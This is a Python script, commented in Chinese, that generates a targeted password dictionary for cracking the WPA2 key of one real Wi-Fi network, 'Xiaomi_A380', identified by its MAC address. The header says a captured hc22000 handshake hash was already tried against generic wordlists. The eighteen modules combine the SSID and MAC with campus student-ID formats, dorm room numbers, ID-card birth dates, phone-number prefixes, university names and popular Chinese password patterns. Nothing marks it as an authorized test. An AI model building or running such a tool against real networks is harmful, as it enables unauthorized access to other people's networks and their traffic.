#!/usr/bin/env python3
# ============================================================================
# Xiaomi_A380 (MAC: A4:BA:70:04:1A:7E) 超强定向字典生成器
# ----------------------------------------------------------------------------
# 核心设计原则：
#   1. SSID 为 "Xiaomi_A380"（带下划线，从 hc22000 hash 精确解码）
#   2. 通用大字典（rockyou, mega160m 等）经实测全部 miss，放弃
#   3. 聚焦校园场景 + 中国人自定义密码典型模式 + 小米设备特征
#   4. 仅生成 8–32 位候选（WPA2 密码长度要求）
# ============================================================================

import os
import sys
from pathlib import Path

# ── 目标参数 ──
TARGET_SSID_VARIANTS = [
    "Xiaomi_A380", "xiaomi_a380", "XIAOMI_A380",
    "XiaomiA380", "xiaomia380", "XIAOMIA380", "Xiaomia380",
    "Xiaomi_a380", "xiaomi_A380",
]
TARGET_CORE = ["a380", "A380", "A_380", "a_380"]
MAC_FULL = "a4ba70041a7e"
MAC_TAIL6 = "041a7e"
MAC_TAIL6_UP = "041A7E"
MAC_TAIL4 = "1a7e"
MAC_TAIL4_UP = "1A7E"

OUT_DIR = Path(__file__).parent / "work" / "xiaomi_a380"
OUT_DIR.mkdir(parents=True, exist_ok=True)
OUT_FILE = OUT_DIR / "xiaomi_a380_targeted.txt"

# ── 收集容器（使用 set 自动去重）──
passwords = set()


def add(pw: str) -> None:
    """加一条密码候选，自动校验长度 8–32"""
    if pw is None:
        return
    s = str(pw).strip()
    if 8 <= len(s) <= 32 and " " not in s:
        passwords.add(s)


# ============================================================================
# 模块 1: SSID 本体及其各种大小写/变形（之前最大的盲区！）
# ============================================================================
def module_ssid_self():
    for s in TARGET_SSID_VARIANTS:
        # SSID 本体（长度可能不够 8 位，但部分够）
        add(s)
        # 反转
        add(s[::-1])
        # 双倍
        add(s + s)
    for s in TARGET_CORE:
        add(s * 2)  # a380a380
        add(s * 3)  # a380a380a380
        add(s + s[::-1])  # a380083a


# ============================================================================
# 模块 2: SSID + 全范围数字后缀/前缀（含带下划线版本！！）
# ============================================================================
def module_ssid_with_numbers():
    """SSID + 数字组合 - 把之前漏掉的带下划线变体全覆盖"""
    # 常见数字后缀
    num_suffixes = [
        # 1-4 位常规
        "1", "12", "123", "1234", "12345", "123456", "1234567", "12345678",
        "123456789", "1234567890",
        # 9-10 位
        "0123456789",
        # 单一数字重复（典型）
        "0", "00", "000", "0000", "00000", "000000", "0000000", "00000000",
        "1111", "11111", "111111", "1111111", "11111111", "111111111",
        "6666", "66666", "666666", "6666666", "66666666",
        "8888", "88888", "888888", "8888888", "88888888",
        "9999", "99999", "999999", "9999999", "99999999",
        # 经典情侣/吉祥数字
        "520", "521", "1314", "5201314", "13141314", "520520", "1314520",
        "520521", "5201314520", "13145201314", "1201314",
        # 168/188/888 吉祥
        "168", "188", "1688", "1888", "8888", "18888", "88888",
        # 中国节日/流行
        "666", "666666", "66668888", "88886666",
        # 年份
        "2019", "2020", "2021", "2022", "2023", "2024", "2025", "2026",
        "20190101", "20200101", "20210101", "20220101",
        "20230101", "20240101", "20250101",
        # 生日模式 MMDD
        "0101", "0202", "0303", "0520", "0528", "0618",
        "0808", "0909", "1010", "1111", "1212", "1225",
        # 常用短组合
        "520a", "5201314a", "a520", "a1314", "a5201314",
        # 3-5 位数字
        "100", "111", "123", "321", "555", "666", "777", "888", "999",
        "1000", "1234", "2000", "2024", "5201", "6666", "8888",
        "10000", "12321", "123321", "123123", "456456", "789789",
        # 倒序
        "987654321", "876543210", "7654321", "654321", "54321",
    ]

    # 特殊字符后缀（中国WiFi研究：.和@最高频）
    spec_suffixes = [
        ".", ".com", ".net", ".cn", "!", "!!", "!!!",
        "@", "@@", "@!", "!@", "@123", "!123", "#123",
        "@2025", "@2024", "!2025", "!2024",
        "@520", "@1314", "!520",
        "#1", "$1", "%1", "^1", "&1", "*1",
        "_123", "_1234", "_12345",
        "...", "___",
    ]

    bases = TARGET_SSID_VARIANTS + TARGET_CORE
    for base in bases:
        for sfx in num_suffixes:
            add(base + sfx)
            add(sfx + base)
        for sfx in spec_suffixes:
            add(base + sfx)


# ============================================================================
# 模块 3: SSID + 规则化数字模式
# ============================================================================
def module_ssid_structured():
    """更结构化的组合模式（年+月+日 + base 等）"""
    # 以 base_ / _base 风格拼接
    cores = ["a380", "A380", "xiaomi", "Xiaomi", "XIAOMI",
             "xiaomi_a380", "Xiaomi_A380", "XIAOMI_A380"]

    # 年份拼接
    for c in cores:
        for yr in range(1965, 2027):
            add(c + str(yr))
            add(str(yr) + c)

    # 年+月+日（典型生日）
    for c in cores:
        for yr in range(1970, 2011):
            add(c + f"{yr}0101")
            add(c + f"{yr}0520")
            add(c + f"{yr}0808")
            add(c + f"{yr}1111")
            add(c + f"{yr}1212")
            add(f"{yr}0101" + c)
            add(f"{yr}0808" + c)

    # base + 月日组合
    mmdd = ["0101", "0202", "0214", "0308", "0501", "0520", "0618",
            "0707", "0808", "0909", "1001", "1010", "1024", "1111",
            "1212", "1225"]
    for c in cores:
        for md in mmdd:
            add(c + md)
            add(md + c)


# ============================================================================
# 模块 4: MAC 地址相关（小米某些型号默认密码=MAC后6位）
# ============================================================================
def module_mac_based():
    """小米早期路由器出厂密码部分带 MAC 尾数特征"""
    mac_parts = [MAC_TAIL4, MAC_TAIL4_UP, MAC_TAIL6, MAC_TAIL6_UP,
                 MAC_FULL, MAC_FULL.upper()]
    common_digits = ["12345678", "87654321", "00000000", "11111111",
                     "88888888", "99999999", "66666666",
                     "123456", "1234", "888888", "666666",
                     "520", "1314", "5201314"]

    for m in mac_parts:
        # MAC + 常用数字
        for d in common_digits:
            add(m + d)
            add(d + m)
        # MAC + 常用字符
        for suf in ["", "!", "@", "#", ".", "_", "-"]:
            add("a" + m + suf)
            add("A" + m + suf)
            add("x" + m + suf)
            add("m" + m + suf)
            add("mi" + m + suf)
            add("xm" + m + suf)
            add("router" + m)
            add("wifi" + m)
            add("admin" + m)

    # 小米典型默认密码模式 "a" + 7位数字（已知小米部分型号出厂：aXXXXXXX）
    for pad in ["000", "111", "123", "520", "666", "888", "999"]:
        add("a1234567")
        add("a" + pad + "1234")
        add("a1" + pad + "567")
        add("a" + pad + "5678")


# ============================================================================
# 模块 5: 中国 2024-2025 流行密码习惯
# ============================================================================
def module_china_2024_2025():
    """最新流行词 + 网络梗 + 典型组合"""
    memes = [
        "yyds", "awsl", "xswl", "nsdd", "bdjw", "juejuezi",
        "niubi", "niubility", "666", "6666", "6666666", "66666666",
        "yyds2024", "yyds2025", "yyds520", "yyds1314",
        "wuliwuli", "shuashuashua", "jiayoujiayou",
        "niubi520", "niubi1314", "niubi666", "niubi8888",
        "wojuedewoxing", "hhhhhhhh",
        "xjj1314", "gege520", "meimei520",
        "nsdd2024", "nsdd2025", "juejuezi123",
    ]
    for w in memes:
        add(w)
        for sfx in ["", "123", "520", "1314", "6666", "8888", "!"]:
            add(w + sfx)

    # 客服号 / 特殊号码（中国人偶尔用作密码）
    service_numbers = [
        "10086", "10010", "10000", "10001", "95533", "95588",
        "95511", "12306", "110119", "120119",
        "10086123", "10010123", "95533666",
        "100861314", "100868888", "10086520",
    ]
    for n in service_numbers:
        add(n)

    # 家庭关系词 + 数字
    family_words = ["baba", "mama", "papa", "daddy", "mommy",
                    "wojia", "home", "house", "family", "jiating",
                    "laogong", "laopo", "baobao", "baby",
                    "husband", "wife", "father", "mother",
                    "shushu", "ayi", "nainai", "yeye",
                    "lovemom", "lovedad", "hubby", "wifey"]
    for w in family_words:
        for sfx in ["1234", "123456", "12345678", "520", "1314",
                    "5201314", "666", "888", "8888", "6666",
                    "2024", "2025", "!", "@123", "_123"]:
            add(w + sfx)


# ============================================================================
# 模块 6: 小米家族产品词（典型小米品牌粉丝设密码）
# ============================================================================
def module_xiaomi_family():
    """小米/红米/MIUI 产品词根的各种组合"""
    brand_roots = [
        "xiaomi", "Xiaomi", "XIAOMI", "mi", "Mi", "MI",
        "redmi", "Redmi", "REDMI", "miwifi", "MiWifi", "MIWIFI",
        "miui", "MIUI", "poco", "POCO", "mijia", "MiJia",
        "xiaomiai", "xiaoai", "XiaoAi",
        "mistore", "mifans", "mifan", "mifen",
    ]

    # 产品型号（常见的）
    models = ["a380", "A380", "ac2100", "AC2100", "ax3000", "AX3000",
              "ax3600", "AX3600", "ax6000", "AX6000", "ax1800",
              "ax5", "ax6", "ax9000", "r3d", "r4ac", "r1c",
              "pro3000", "cr660"]

    common = ["", "123", "1234", "12345", "123456", "12345678",
              "520", "1314", "888", "8888", "88888888",
              "666", "6666", "66666666", "0000", "00000000",
              "2024", "2025", "!", "@123", ".com", "_wifi"]

    for b in brand_roots:
        for m in models:
            for c in common:
                add(b + m + c)
                add(m + b + c)
                add(b + c + m)

    # 小米路由器关键词 + 数字
    for kw in ["miwifi", "xiaomirouter", "xiaomiwifi", "miroute",
               "mihome", "mifi", "xmwifi"]:
        for d in ["123", "1234", "12345", "123456", "12345678",
                  "888", "8888", "88888888", "66668888",
                  "520", "1314", "5201314",
                  "!", "@123", "@2024", "@2025"]:
            add(kw + d)
            add(d + kw)


# ============================================================================
# 模块 7: 中国省份/地名拼音 + 数字
# ============================================================================
def module_china_locations():
    """中国人喜欢用地名作密码，尤其小区/城市"""
    locations = [
        # 直辖市/超一线
        "beijing", "shanghai", "guangzhou", "shenzhen", "tianjin",
        "chongqing", "hangzhou", "nanjing", "chengdu", "wuhan",
        "xian", "suzhou", "changsha", "qingdao", "dalian",
        "ningbo", "jinan", "xiamen", "fuzhou", "kunming",
        "hefei", "shijiazhuang", "nanning", "nanchang", "zhengzhou",
        "guiyang", "lanzhou", "harbin", "changchun", "shenyang",
        # 省份简写
        "beijing2024", "shanghai2024", "guangdong", "zhejiang",
        "jiangsu", "shandong", "fujian", "hubei", "henan", "sichuan",
        # 区号
        "010", "021", "0755", "0571", "0532", "0591", "0592",
    ]
    for loc in locations:
        add(loc)
        for sfx in ["123", "1234", "12345", "123456", "12345678",
                    "520", "1314", "666", "888", "8888",
                    "2024", "2025", "!", "@123"]:
            add(loc + sfx)


# ============================================================================
# 模块 8: 键盘走位 + 变体（8+位）
# ============================================================================
def module_keyboard_patterns():
    patterns = [
        # 横向
        "qwertyuiop", "asdfghjkl", "zxcvbnm", "qwerty123",
        "qwertyui", "asdfghjk", "1234qwer", "qwer1234",
        "123qweasd", "qweasdzxc", "qazwsxedc", "1qazxsw2",
        "1qaz@wsx", "1qaz!@wsx", "1q2w3e4r5t", "1q2w3e4r",
        "a1b2c3d4", "a1b2c3d4e5", "abc123!@#",
        # 反向
        "poiuytrewq", "mnbvcxz", "0987654321",
        # 键盘几何
        "147258369", "159357", "258369", "369258147",
        "1470258", "1470258369", "369147258",
        "14725836", "147258369630",
        # 数字+字母交替
        "a1b2c3d4", "1a2b3c4d", "a1234567",
        "abc12345", "abcd1234", "abcde12345",
        # 键盘对角
        "qaz123", "wsx456", "edc789", "qaz!@#",
        "1qaz2wsx3edc", "qaz2wsx", "zaq12wsx",
    ]
    for p in patterns:
        add(p)
        for s in ["!", "@", "!@#", "520", "1314", "a380", "A380",
                  "2024", "2025"]:
            add(p + s)
            add(s + p)


# ============================================================================
# 模块 9: 中国手机号段 + 后 8 位规律枚举（不穷举全部，而是精选）
# ============================================================================
def module_mobile_prefixes():
    """中国最新手机号段 + 典型后缀"""
    # 最新（2024）中国手机号段前 3 位
    prefixes = [
        # 中国移动
        "134", "135", "136", "137", "138", "139",
        "147", "148", "150", "151", "152", "157", "158", "159",
        "172", "178", "182", "183", "184", "187", "188", "198",
        # 中国联通
        "130", "131", "132", "145", "146", "155", "156", "166",
        "167", "171", "175", "176", "185", "186",
        # 中国电信
        "133", "149", "153", "173", "177", "180", "181", "189",
        "190", "191", "193", "199",
        # 虚拟运营商
        "162", "165", "170",
    ]

    # 常见"后8位"只做有规律的（避免全量爆破，生成密码太多）
    common_tails = [
        "12345678", "87654321", "88888888", "00000000",
        "66666666", "99999999", "11111111", "22223333",
        "13141314", "52015201",
    ]

    for p in prefixes:
        for t in common_tails:
            add(p + t)
        # 手机号 + 常见尾数（完整 11 位不行，但加后缀可以）
        for yr in ["2024", "2025"]:
            add(p + "1234" + yr)
            add(p + "5201" + yr[-4:])
        # "a" / "m" / "x" 前缀 + 手机号模式
        for pfx in ["a", "A", "m", "M", "x", "X"]:
            add(pfx + p + "12345678")
            add(pfx + p + "88888888")


# ============================================================================
# 模块 10: 身份证后 8 位（YYYYMMDD 生日）全覆盖（1950-2010，精选日期）
# ============================================================================
def module_id_card_dates():
    """身份证后8位 = YYYYMMDD 生日（中国人最爱用）"""
    # 完整年月日 1950-2010（仅月份 1/6/10/12，日期精选）
    special_days = [
        # 情人节/七夕
        "0214", "0807", "0814",
        # 新年
        "0101", "1231", "1230",
        # 五一/十一
        "0501", "0502", "1001", "1002", "1003",
        # 端午/中秋
        "0528", "0615", "0625", "0915", "0925", "1005",
        # 情侣日
        "0520", "0521", "0813", "1024",
        # 圣诞
        "1225", "1224",
        # 儿童节/妇女节
        "0308", "0601", "0604",
        # 生日开头
        "0808", "0909", "1111", "1212", "0606",
    ]
    for yr in range(1955, 2011):
        for md in special_days:
            add(f"{yr}{md}")

    # 完全 MMDD 循环
    for m in range(1, 13):
        for d in range(1, 32):
            date = f"{m:02d}{d:02d}"
            # 纯 MMDD 不足 8 位，与年份组合
            for yr in ["1980", "1985", "1988", "1990", "1992",
                       "1995", "1998", "2000", "2005"]:
                add(yr + date)


# ============================================================================
# 模块 11: 常见英文名 + 中文名拼音 + 数字（中国典型）
# ============================================================================
def module_names():
    """姓名拼音 + 典型数字"""
    # 常见英文名
    eng_names = ["John", "Jenny", "Jack", "Mary", "David",
                 "Tom", "Jerry", "Mike", "Alice", "Bob",
                 "Amy", "Anna", "Kevin", "Peter", "Lucy",
                 "linda", "lucy", "jack", "tony", "angel"]

    # 中国常见姓拼音
    cn_surnames = [
        "wang", "li", "zhang", "liu", "chen", "yang", "zhao", "huang",
        "zhou", "wu", "xu", "sun", "hu", "zhu", "gao", "lin",
        "he", "guo", "ma", "luo", "liang", "song", "zheng", "xie",
        "han", "tang", "feng", "yu", "dong", "xiao",
    ]

    # 常见中文名拼音（约 30 个）
    cn_fullnames = [
        "xiaoming", "xiaohong", "xiaohua", "xiaoqiang",
        "xiaoli", "xiaowang", "xiaozhang", "xiaochen",
        "xiaoyu", "xiaojing", "xiaowei", "xiaohui",
        "zhangwei", "liwei", "wangwei", "liufang",
        "chenjing", "yanglei", "zhaomin", "huangli",
        "zhouyan", "wulei", "xujie", "sunyang",
        "ivanbeast", "girlpower", "bestboy", "coolman",
        "lovely", "sweetie", "darling", "honey",
    ]

    # 所有名字 + 数字
    all_names = eng_names + cn_surnames + cn_fullnames
    for name in all_names:
        for sfx in ["123", "1234", "12345", "123456", "1234567",
                    "12345678", "123456789",
                    "520", "1314", "5201314", "13141314",
                    "666", "888", "6666", "8888", "66666666",
                    "2024", "2025", "0000", "8888",
                    "2000", "1990", "1995", "1985", "1988",
                    "!", "@", "@123", "!123", "@2024", "@2025",
                    "_123", "a380", "a1314"]:
            add(name + sfx)
            add(name.capitalize() + sfx)


# ============================================================================
# 模块 12: 小米管理员密码典型（小米默认建议：WiFi密码=管理密码）
# ============================================================================
def module_admin_patterns():
    """小米管理员/WiFi 密码统一模式"""
    admin_bases = [
        "admin", "Admin", "ADMIN", "administrator",
        "root", "Root", "ROOT",
        "password", "Password", "PASSWORD", "passwd",
        "manager", "Manager", "MANAGER",
        "router", "Router", "ROUTER",
        "wifi", "Wifi", "WIFI", "wireless",
        "miwifi", "MiWifi", "MIWIFI",
        "xiaomi", "Xiaomi", "XIAOMI",
    ]

    # 与 a380 的组合
    for b in admin_bases:
        for c in ["a380", "A380", "a_380", "A_380"]:
            add(b + c)
            add(c + b)
            add(b + "_" + c)
            add(c + "_" + b)

        # 与年份/数字组合
        for sfx in ["2024", "2025", "123456", "12345678",
                    "888888", "88888888", "666666", "000000",
                    "520", "1314", "5201314", "520131414",
                    "!", "!@#", "@123", "@1234", "@12345",
                    "@2024", "@2025", "@a380", "@A380",
                    "_a380", "_A380", "_2024", "_2025",
                    ".", ".com", ".cn", ".net"]:
            add(b + sfx)

    # "admin+数字+字母" 超典型
    for n in ["12345", "123456", "1234567", "12345678"]:
        for b in ["admin", "Admin", "xiaomi", "a380", "A380"]:
            add(b + n + b)  # adminadminadmin
            add(b + n + "!")
            add(b + n + "@")


# ============================================================================
# 模块 13: 基于"x_a380"的工程化自动组合（WiFi 路由命名常见格式）
# ============================================================================
def module_engineered():
    """工程化组合：[词1][分隔符][词2] 格式"""
    parts_l = ["xiaomi", "mi", "home", "my", "wifi",
               "mom", "dad", "love", "cute", "lucky"]
    parts_r = ["a380", "A380", "2024", "2025",
               "88888888", "12345678", "520", "1314"]
    seps = ["", "_", "-", ".", "@", "123", "520"]

    for l_part in parts_l:
        for sep in seps:
            for r_part in parts_r:
                add(l_part + sep + r_part)
                add(l_part.capitalize() + sep + r_part)

    # 模仿 "Xiaomi_A380" 风格密码
    for sfx in ["1234", "12345", "123456", "12345678", "520", "1314",
                "666", "888", "8888", "66666666", "88888888",
                "2024", "2025", "@123", "!123", ".com"]:
        for body in ["Xiaomi_A380", "xiaomi_a380",
                     "Xiaomi_a380", "XiaomiA380"]:
            add(body + sfx)
            add(sfx + body)
            # 加分隔符
            add(body + "_" + sfx)
            add(body + "." + sfx)
            add(body + "@" + sfx)
            add(body + "-" + sfx)


# ============================================================================
# 模块 14: 校园场景 - 学号（中国高校学号格式）
# ============================================================================
def module_campus_student_id():
    """中国高校学号典型格式：8/10/12 位数字"""
    # 入学年份范围（近 12 届在校可能 + 老校友）
    enrol_years = list(range(2010, 2027))

    # 8 位学号：YYYY + 4 位序号（部分高校使用）
    for yr in enrol_years:
        # 前 4 位年份 + 后 4 位精选序号（高频序号段）
        for serial in range(1, 1000):
            add(f"{yr}{serial:04d}")
        # 后 4 位典型（整数、尾数）
        for tail in ["0001", "0002", "0010", "0100", "1000",
                     "0101", "0808", "0520", "1314", "8888",
                     "6666", "9999", "1234", "5678"]:
            add(f"{yr}{tail}")

    # 10 位学号：YYYY + 6 位院系+序号（中山/武大等高校）
    # 覆盖：YYYY + 3 位院系 + 3 位序号（每院系 0-50 序号）
    top_depts = ["001", "002", "003", "004", "005", "006", "007", "008",
                 "010", "011", "012", "013", "014", "015", "016", "018",
                 "020", "030", "050", "060", "080", "100", "110", "120",
                 "150", "200", "210", "220", "230", "250", "300", "310",
                 "320", "350", "400", "410", "500", "510", "600", "610"]
    for yr in [2019, 2020, 2021, 2022, 2023, 2024, 2025]:
        for dept in top_depts[:15]:
            for serial in range(1, 51):
                add(f"{yr}{dept}{serial:03d}")

    # 12 位学号：YYYY + 院系2位 + 班级2位 + 序号4位
    for yr in [2020, 2021, 2022, 2023, 2024, 2025]:
        for dept in ["01", "02", "03", "04", "05", "06", "08", "10",
                     "11", "12", "15", "20", "30", "50"]:
            for clz in ["01", "02", "03", "05", "10"]:
                for serial in [1, 5, 10, 20, 30, 50, 66, 88, 100]:
                    add(f"{yr}{dept}{clz}{serial:04d}")


# ============================================================================
# 模块 15: 校园场景 - 中国大学名拼音 + 数字
# ============================================================================
def module_university_names():
    """全国主要高校拼音缩写和全称"""
    universities = [
        # 顶尖综合
        "pku", "beida", "beidaren", "tsinghua", "qinghua", "tsinghua2024",
        "fudan", "fudanren", "jiaotong", "sjtu", "shangjiaotong",
        "zhejiangdaxue", "zhejiangdaxue2024", "zhedauniv", "zju", "zheda",
        "nankai", "tianjindaxue", "nju", "nanjingdaxue", "nanda",
        # 工科
        "harbin", "hit", "harbingongye", "harbingongda", "haerbin",
        "beihang", "bjut", "beigong", "beijiaotongdaxue",
        "tongji", "tongjidaxue", "tongjixiaozhu",
        "huakeda", "huazhongkeda", "hust", "huazhongligongdaxue",
        "huanan", "scut", "huanangongxueyuan", "huananligong",
        "zhongda", "zhongshandaxue", "sysu",
        "xiandajiaotong", "xjtu", "xianjiaotong",
        # 师范
        "beishida", "bnu", "beijingshifan", "beijingshida",
        "huadongshida", "ecnu", "huadongshifan",
        "huazhongshifan", "ccnu", "huazhongshida",
        # 财经/外语
        "zgrenmindaxue", "ruc", "renmindaxue",
        "cufe", "caijing", "zhongjingdaxue",
        "bfsu", "waiguoyu", "beiwai",
        # 专业类
        "beiyou", "bupt", "beijingyoudian",
        "ustc", "zhongkeda", "zhongguokexue",
        "uibe", "jingmao", "waijingmao",
        # 211 高校部分
        "xinan", "xndx", "xinandaxue", "xinanshifan", "xinanzhengfa",
        "dbdx", "dongbeidaxue", "dongbeishifan",
        "shandongdaxue", "sdu", "shandaxue",
        "wuhan", "whu", "wudayihao", "whuwh",
        "lanzhou", "lzu", "lanzhoudaxue",
        "jilin", "jlu", "jilindaxue",
        "sichuan", "scu", "sichuandaxue", "chuandaxue", "chuanda",
        "zhongnan", "csu", "zhongnandaxue",
        "hunan", "hndx", "hunandaxue",
        "xiadaxue", "xmu", "xiamendaxue",
        # 省内普通
        "hunanshida", "shidaxue", "shifanxueyuan",
        "gongxue", "gongxueyuan", "keda", "keji", "kejidaxue",
        "shidaxueyuan", "caijingdaxue", "ligongxueyuan",
        "huagong", "yiyao", "yiyaodaxue", "zhongyiyaodaxue",
        "dianlidaxue", "jiaoyuxueyuan", "yuanlin", "nongyedaxue",
        "nonglinkeda", "linyedaxue", "caimaodaxue",
    ]

    suffix_sets = [
        # 数字后缀
        "123", "1234", "12345", "123456", "1234567", "12345678",
        "123456789", "0000", "8888", "6666", "9999",
        "520", "1314", "5201314", "13141314",
        "666", "888", "2024", "2025", "2024!", "2025!",
        # 年份
        "2019", "2020", "2021", "2022", "2023",
        # 特殊字符
        "!", "@", "#", ".", "_", "@123", "@2024", "@2025",
        "!123", "#2024", ".com", ".cn",
        # a380 结合
        "a380", "A380", "_a380", "_A380",
    ]

    for uni in universities:
        add(uni)
        # 大写首字母
        add(uni.capitalize())
        for sfx in suffix_sets:
            add(uni + sfx)
            add(uni.capitalize() + sfx)


# ============================================================================
# 模块 16: 校园场景 - 宿舍号（字母+数字典型格式）
# ============================================================================
def module_dorm_rooms():
    """宿舍号：A101-Z999, 1-30栋房间号"""
    # 格式 1: 字母 + 3 位数字
    import itertools
    for letter in "ABCDEF":
        for floor in range(1, 10):
            for room in range(1, 51):
                dorm = f"{letter}{floor}{room:02d}"
                # 单独 5 位不够 8 位，与 base 组合
                for base in ["wifi", "xiaomi", "a380", "home", "dorm",
                             "love", "gang", "shushe", "woaini"]:
                    add(base + dorm)
                    add(dorm + base)

    # 格式 2: 楼栋号 + 房间号（如 1-301, 5-818）
    for bld in range(1, 31):
        for room_pre in [1, 2, 3, 4, 5, 6, 7, 8]:
            for room_post in [1, 5, 8, 10, 15, 18, 20, 25, 30, 40, 50, 66, 88]:
                dorm_num = f"{bld:02d}{room_pre}{room_post:02d}"
                # 7 位通常不够 8 位，加前缀
                for pre in ["dorm", "room", "home", "s", "w", "a"]:
                    add(pre + dorm_num)

    # 格式 3: 纯房间号 101-899 + 日期/数字组合
    for room in range(101, 900, 2):
        for yr in ["2023", "2024", "2025"]:
            add(f"room{room}{yr}")
            add(f"dorm{room}{yr}")


# ============================================================================
# 模块 17: 校园场景 - 身份证后 6/8 位 (YYYYMMDD 生日)
# ============================================================================
def module_id_card_birthdays():
    """身份证核心：YYYYMMDD 8 位出生日期（校园网初始密码最常见）"""
    import calendar
    # 精确 YYYYMMDD（1955-2010 生源范围）
    for yr in range(1955, 2011):
        for m in range(1, 13):
            _, days_in_month = calendar.monthrange(yr, m)
            for d in range(1, days_in_month + 1):
                add(f"{yr}{m:02d}{d:02d}")

    # 身份证后 6 位: YYMMDD + 后 2 位（校验位/顺序码）
    for yr2 in range(55, 100):
        for yr_prefix in ["19"]:
            for m in [1, 5, 6, 8, 10, 12]:
                for d in [1, 8, 15, 20, 28]:
                    base6 = f"{yr2:02d}{m:02d}{d:02d}"
                    for tail in ["00", "01", "10", "11", "12", "20",
                                 "21", "22", "88", "99", "0X", "1X",
                                 "a", "b", "c", "X", "1314", "520"]:
                        add(base6 + tail)

    for yr2 in range(0, 11):
        for m in [1, 5, 6, 8, 10, 12]:
            for d in [1, 8, 15, 20, 28]:
                base6 = f"{yr2:02d}{m:02d}{d:02d}"
                for tail in ["00", "01", "10", "88", "99", "a", "X",
                             "1314", "520", "2024", "2025"]:
                    add(base6 + tail)


# ============================================================================
# 模块 18: 强密码 - 首字母大写+小写+数字+特殊（企业/校园强制密码策略）
# ============================================================================
def module_strong_passwords():
    """强密码典型模式：大小写+数字+特殊字符，8-12 位"""
    # 常见强密码基础词（人类最常用的）
    strong_bases = [
        "Password", "Passw0rd", "Pa$$w0rd", "Passw0rd!",
        "Admin", "Admin123", "Admin@123", "Admin@2024", "Admin@2025",
        "Root", "Root@123", "Root2024", "Root2025",
        "Xiaomi", "Xiaomi@123", "Xiaomi2024", "Xiaomi2025",
        "XiaomiA380", "Xiaomi_A380", "xiaomiA380",
        "Wifi", "Wifi@123", "Wifi2024", "Wifi2025", "Wifi@A380",
        "Router", "Router@123", "Router2025",
        "Welcome", "Welcome1", "Welcome123", "Welcome@2024",
        "Manager", "Manager123", "Manager@123",
        "Qwerty", "Qwerty123", "Qwerty@123", "Qwerty!",
        "China", "China123", "China2024", "China2025", "China@123",
        "Zhongguo", "Zhongguo2024", "Zhongguo@123",
        "Home", "Home123", "Home@123", "Home2024",
        "School", "School123", "School@123", "School2024",
        "Student", "Student123", "Student2024",
        "Campus", "Campus123", "Campus@2024",
        "Love", "Love520", "Love1314", "LoveU",
        "Iloveu", "Iloveyou", "Loveyou",
        # 中国特色
        "Zhongguohao", "Zhongguoren", "Zhongguoshi",
        "Beijing", "Beijing2024", "Beijing@2025",
        "Shanghai", "Shanghai@123", "Shanghai2024",
        "Guangzhou", "Shenzhen", "Hangzhou",
    ]
    for b in strong_bases:
        add(b)
        for s in ["1", "12", "123", "1234", "12345", "123456", "1234567",
                  "12345678", "123456789", "520", "1314", "5201314",
                  "888", "8888", "66", "6666",
                  "!", "!!", "@", "@@", "#", "$", "@!", "!@#", "!@#$",
                  "@123", "!123", "#123", "$123",
                  "@1234", "@12345", "@123456", "@12345678",
                  "@2024", "@2025", "#2024", "#2025",
                  "2024", "2025", "2023",
                  "@home", "@love", "@a380",
                  ".", ".com", "..",
                  "520!", "1314!", "@520", "@1314"]:
            add(b + s)
        # 反向组合（数字/字符在前）
        for pre in ["123", "520", "1314", "2024", "2025", "@", "!", "a380"]:
            add(pre + b)

    # 全自动组合：3 字母词 + 数字 + 特殊字符
    words3 = ["Abc", "Cat", "Dog", "Sun", "Sky", "Red", "Qwe", "Asd", "Zxc"]
    for w in words3:
        for nums in ["123456", "1234567", "12345678"]:
            for spec in ["", "!", "@", "#", "$", ".", "@!", "!@#"]:
                add(w + nums + spec)


# ============================================================================
# 主函数：执行所有模块并写出
# ============================================================================
def main():
    print(">> 开始生成 Xiaomi_A380 超强定向字典...")

    modules = [
        ("模块1: SSID 本体变形",      module_ssid_self),
        ("模块2: SSID+数字/字符",     module_ssid_with_numbers),
        ("模块3: SSID+年月日结构",    module_ssid_structured),
        ("模块4: MAC 相关变体",       module_mac_based),
        ("模块5: 2024-2025 流行词",   module_china_2024_2025),
        ("模块6: 小米家族产品词",     module_xiaomi_family),
        ("模块7: 中国省市地名",       module_china_locations),
        ("模块8: 键盘走位模式",       module_keyboard_patterns),
        ("模块9: 最新手机号段",       module_mobile_prefixes),
        ("模块10: 身份证日期",        module_id_card_dates),
        ("模块11: 中英文姓名",        module_names),
        ("模块12: 管理员密码模式",    module_admin_patterns),
        ("模块13: 工程化组合",        module_engineered),
        ("模块14: 校园学号 8-12位",   module_campus_student_id),
        ("模块15: 中国大学名拼音",    module_university_names),
        ("模块16: 宿舍号组合",        module_dorm_rooms),
        ("模块17: 身份证生日",        module_id_card_birthdays),
        ("模块18: 强密码模式",        module_strong_passwords),
    ]

    for name, fn in modules:
        before = len(passwords)
        fn()
        after = len(passwords)
        print(f"  {name}: +{after - before:>6} 条  (累计 {after})")

    # ── 写出 ──
    sorted_pw = sorted(passwords, key=lambda x: (len(x), x))
    with open(OUT_FILE, "w", encoding="utf-8") as f:
        for pw in sorted_pw:
            f.write(pw + "\n")

    print()
    print(f">> 完成！共生成 {len(sorted_pw)} 条独立密码")
    print(f">> 输出文件: {OUT_FILE}")
    print(f">> 文件大小: {OUT_FILE.stat().st_size / 1024:.1f} KB")


if __name__ == "__main__":
    main()
